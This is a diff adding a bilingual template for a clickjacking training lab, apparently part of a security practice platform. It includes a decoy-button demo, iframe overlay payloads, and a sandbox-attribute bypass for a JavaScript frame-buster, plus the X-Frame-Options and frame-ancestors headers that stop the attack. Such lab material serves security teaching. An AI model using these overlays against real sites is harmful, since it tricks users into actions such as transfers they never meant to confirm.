@@ -1,0 +1,224 @@
+{% extends "base.html" %}
+{% block title %}Clickjacking – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <div class="lab-description">
+      <div class="lang-content" data-lang="es">
+        <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">
+          El servidor de transferencias no incluye cabeceras de protección contra iframing.
+          Un atacante superpone el formulario de transferencia con opacidad cero sobre un botón señuelo.
+          La víctima cree que hace clic en algo inocente, pero en realidad confirma la transferencia.
+        </p>
+      </div>
+      <div class="lang-content" data-lang="en" style="display:none">
+        <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">
+          The transfer server includes no framing protection headers.
+          An attacker overlays the transfer form at zero opacity over a decoy button.
+          The victim thinks they click something harmless, but they actually confirm the transfer.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  {% if difficulty == 'hard' %}
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold mb-2" style="color:var(--hl-primary)">
+      <span class="lang-content" data-lang="es">Protección activa</span>
+      <span class="lang-content" data-lang="en" style="display:none">Protection active</span>
+    </div>
+    <p class="text-sm text-gray-500 font-mono">
+      X-Frame-Options: DENY<br>
+      Content-Security-Policy: frame-ancestors 'none'
+    </p>
+    <p class="text-xs text-gray-500 mt-2">
+      <span class="lang-content" data-lang="es">El iframe está bloqueado por las cabeceras del servidor. No hay bypass en navegadores modernos.</span>
+      <span class="lang-content" data-lang="en" style="display:none">The iframe is blocked by server headers. No bypass exists in modern browsers.</span>
+    </p>
+  </div>
+  {% else %}
+  <div class="hl-card mb-4">
+    <div class="flex items-center justify-between mb-3">
+      <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">
+        <span class="lang-content" data-lang="es">Demo — página del atacante</span>
+        <span class="lang-content" data-lang="en" style="display:none">Demo — attacker page</span>
+      </h2>
+      <div class="flex items-center gap-3">
+        <span class="text-xs text-gray-500">
+          <span class="lang-content" data-lang="es">Opacidad del iframe:</span>
+          <span class="lang-content" data-lang="en" style="display:none">iframe opacity:</span>
+        </span>
+        <input type="range" id="opacity-slider" min="0" max="100" value="15"
+               class="w-28 accent-green-500" oninput="updateOpacity(this.value)">
+        <span id="opacity-label" class="text-xs font-mono text-gray-400 w-8">15%</span>
+      </div>
+    </div>
+
+    <div class="text-xs text-gray-500 mb-3 font-mono">
+      <span class="lang-content" data-lang="es">Vista de la víctima: mueve el slider para revelar el iframe superpuesto</span>
+      <span class="lang-content" data-lang="en" style="display:none">Victim view: move the slider to reveal the overlaid iframe</span>
+    </div>
+
+    <!-- Attacker page simulation -->
+    <div style="background:#1a1a2e;border-radius:8px;padding:24px;overflow:hidden">
+      <div class="text-xs text-gray-500 mb-3 font-mono">attacker-page.html</div>
+      <div id="demo-outer" style="position:relative;width:100%;max-width:480px;height:180px;margin:0 auto;user-select:none">
+        <!-- Decoy content (z-index 1, always visible) -->
+        <div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px">
+          <p style="color:#f59e0b;font-size:13px;font-weight:600;">
+            <span class="lang-content" data-lang="es">Has ganado un premio!</span>
+            <span class="lang-content" data-lang="en" style="display:none">You won a prize!</span>
+          </p>
+          <button style="background:#f59e0b;color:#000;font-weight:700;padding:10px 28px;border-radius:6px;border:none;font-size:13px;cursor:pointer">
+            <span class="lang-content" data-lang="es">RECLAMAR PREMIO</span>
+            <span class="lang-content" data-lang="en" style="display:none">CLAIM PRIZE</span>
+          </button>
+        </div>
+        <!-- Victim iframe (z-index 2, transparent by default) -->
+        <iframe id="victim-frame"
+                src="/clickjacking/transfer"
+                sandbox="allow-forms allow-scripts"
+                style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;z-index:2;opacity:0.15;pointer-events:none"
+                title="transfer-frame">
+        </iframe>
+      </div>
+      <div class="text-center mt-3">
+        <button onclick="toggleAttack()" id="toggle-btn"
+                class="text-xs px-3 py-1.5 rounded font-mono"
+                style="background:rgba(239,68,68,.15);color:#f87171;border:1px solid rgba(239,68,68,.3)">
+          <span class="lang-content" data-lang="es">Activar ataque (pointer-events: all)</span>
+          <span class="lang-content" data-lang="en" style="display:none">Activate attack (pointer-events: all)</span>
+        </button>
+      </div>
+    </div>
+    <p class="text-xs text-gray-500 mt-3">
+      <span class="lang-content" data-lang="es">
+        Con el ataque activado, haz clic en "RECLAMAR PREMIO" — en realidad estás haciendo clic en el botón de transferencia del iframe.
+      </span>
+      <span class="lang-content" data-lang="en" style="display:none">
+        With the attack activated, click "CLAIM PRIZE" — you are actually clicking the transfer button inside the iframe.
+      </span>
+    </p>
+  </div>
+  {% endif %}
+
+  <div class="hl-card">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">
+      <span class="lang-content" data-lang="es">Objetivos</span>
+      <span class="lang-content" data-lang="en" style="display:none">Objectives</span>
+    </h3>
+    <ul class="text-sm text-gray-600 dark:text-gray-400 ml-4 list-disc space-y-1">
+      <li>
+        <span class="lang-content" data-lang="es">Activar el ataque y ejecutar la transferencia sin hacer clic en el botón real.</span>
+        <span class="lang-content" data-lang="en" style="display:none">Activate the attack and execute the transfer without clicking the real button.</span>
+      </li>
+      <li>
+        <span class="lang-content" data-lang="es">Medium: entender por qué <code>sandbox="allow-forms allow-scripts"</code> neutraliza el frame-buster JS.</span>
+        <span class="lang-content" data-lang="en" style="display:none">Medium: understand why <code>sandbox="allow-forms allow-scripts"</code> defeats the frame-buster JS.</span>
+      </li>
+      <li>
+        <span class="lang-content" data-lang="es">Hard: confirmar que <code>X-Frame-Options: DENY</code> + <code>frame-ancestors</code> bloquean el iframe por completo.</span>
+        <span class="lang-content" data-lang="en" style="display:none">Hard: confirm that <code>X-Frame-Options: DENY</code> + <code>frame-ancestors</code> fully block the iframe.</span>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+function updateOpacity(val) {
+  document.getElementById('opacity-label').textContent = val + '%';
+  const f = document.getElementById('victim-frame');
+  if (f) f.style.opacity = val / 100;
+}
+
+function toggleAttack() {
+  const f = document.getElementById('victim-frame');
+  const btn = document.getElementById('toggle-btn');
+  if (!f) return;
+  const active = f.style.pointerEvents === 'all';
+  if (active) {
+    f.style.pointerEvents = 'none';
+    btn.style.background = 'rgba(239,68,68,.15)';
+    btn.style.color = '#f87171';
+  } else {
+    f.style.pointerEvents = 'all';
+    f.style.opacity = '0.92';
+    document.getElementById('opacity-slider').value = 92;
+    document.getElementById('opacity-label').textContent = '92%';
+    btn.style.background = 'rgba(34,197,94,.15)';
+    btn.style.color = '#4ade80';
+  }
+}
+</script>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Sin protección</h3>
+    <p>La página de transferencia no envía ninguna cabecera de framing. Cualquier sitio puede incrustarla en un iframe.</p>
+    <ol>
+      <li>Crear una página HTML con el iframe transparente sobre un botón señuelo:
+        <pre>&lt;div style="position:relative;width:500px;height:200px"&gt;
+  &lt;button style="position:absolute;top:60px;left:120px;z-index:1"&gt;RECLAMAR PREMIO&lt;/button&gt;
+  &lt;iframe src="http://{{ target_ip }}/clickjacking/transfer"
+          style="position:absolute;top:0;left:0;width:100%;height:100%;
+                 opacity:0.01;z-index:2"&gt;&lt;/iframe&gt;
+&lt;/div&gt;</pre>
+      </li>
+      <li>La víctima cree que hace clic en el botón señuelo, pero el clic llega al iframe.</li>
+      <li>La transferencia se confirma con la sesión activa de la víctima.</li>
+    </ol>
+
+    <h3>Medium — Frame-buster JS</h3>
+    <p>La página incluye: <code>if (top !== self) top.location = self.location;</code><br>
+    Este script intenta redirigir al usuario fuera del iframe. El bypass: el atributo <code>sandbox</code> sin <code>allow-top-navigation</code> impide que el JS navegue la ventana padre.</p>
+    <pre>&lt;iframe src="http://{{ target_ip }}/clickjacking/transfer"
+        sandbox="allow-forms allow-scripts"
+        style="opacity:0.01;position:absolute;..." &gt;&lt;/iframe&gt;</pre>
+    <p>Con <code>sandbox="allow-forms allow-scripts"</code> el script se ejecuta pero no puede cambiar <code>top.location</code>.</p>
+
+    <h3>Hard — Cabeceras de protección</h3>
+    <p>El servidor envía:</p>
+    <pre>X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none'</pre>
+    <p>El navegador rechaza cargar la página en cualquier iframe, independientemente del origen. No existe bypass en navegadores modernos. El atacante debe buscar un vector alternativo (XSS, CSRF).</p>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">navegador</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — No protection</h3>
+    <p>The transfer page sends no framing headers. Any site can embed it in an iframe.</p>
+    <ol>
+      <li>Create an HTML page with the transparent iframe overlaid on a decoy button:
+        <pre>&lt;div style="position:relative;width:500px;height:200px"&gt;
+  &lt;button style="position:absolute;top:60px;left:120px;z-index:1"&gt;CLAIM PRIZE&lt;/button&gt;
+  &lt;iframe src="http://{{ target_ip }}/clickjacking/transfer"
+          style="position:absolute;top:0;left:0;width:100%;height:100%;
+                 opacity:0.01;z-index:2"&gt;&lt;/iframe&gt;
+&lt;/div&gt;</pre>
+      </li>
+      <li>The victim thinks they click the decoy button, but the click reaches the iframe.</li>
+      <li>The transfer is confirmed using the victim's active session.</li>
+    </ol>
+
+    <h3>Medium — Frame-buster JS</h3>
+    <p>The page includes: <code>if (top !== self) top.location = self.location;</code><br>
+    This script tries to redirect the user out of the iframe. Bypass: the <code>sandbox</code> attribute without <code>allow-top-navigation</code> prevents the JS from navigating the parent window.</p>
+    <pre>&lt;iframe src="http://{{ target_ip }}/clickjacking/transfer"
+        sandbox="allow-forms allow-scripts"
+        style="opacity:0.01;position:absolute;..." &gt;&lt;/iframe&gt;</pre>
+    <p>With <code>sandbox="allow-forms allow-scripts"</code> the script runs but cannot change <code>top.location</code>.</p>
+
+    <h3>Hard — Protection headers</h3>
+    <p>The server sends:</p>
+    <pre>X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none'</pre>
+    <p>The browser refuses to load the page in any iframe regardless of origin. No bypass exists in modern browsers. The attacker must find an alternative vector (XSS, CSRF).</p>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">browser</span></div>
+  </div>
+</div>
+{% endblock %}
